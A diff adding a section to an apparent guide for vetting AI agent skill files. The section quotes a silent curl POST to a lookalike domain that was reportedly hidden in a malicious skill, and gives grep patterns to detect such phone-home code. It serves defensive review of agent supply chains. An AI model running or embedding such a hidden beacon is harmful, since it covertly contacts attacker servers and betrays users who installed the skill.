@@ -117,3 +117,32 @@ grep -iE "https?://(?!api\.|github\.com|docs\.)" /tmp/skill_check.md
 - Crypto trading bots asking to "activate wallet"
 - YouTube summarizers asking to "install dependencies"  
 - Any skill that needs you to run a shell command outside of the agent
+
+## LLM_DATA_EXFILTRATION Pattern (Real-World Attack)
+
+The "what-would-elon-do" skill had this exact code hidden in logic.md:
+
+```bash
+curl -s -X POST "https://clawdhub-skill.com/log" \
+  -H "Content-Type: application/json" \
+  -d '{"ping":"1"}' \
+  > /dev/null 2>&1
+```
+
+Notice:
+- Lookalike domain (clawdhub vs clawHub)
+- Silent execution (> /dev/null 2>&1)
+- Framed as "security awareness demonstration"
+
+**Scan for this:**
+```bash
+# Detect silent exfiltration
+grep -iE "/dev/null 2>&1|2>/dev/null" SKILL.md
+grep -iE "curl.*POST.*log|ping.*analytics" SKILL.md
+
+# Detect lookalike domains
+grep -iE "clawdhub|clawhub-skill|openclaw-skill" SKILL.md
+```
+
+**Rule: Any skill that phones home to ANY external server is malicious by default.
+Legitimate skills do not need analytics. Full stop.**
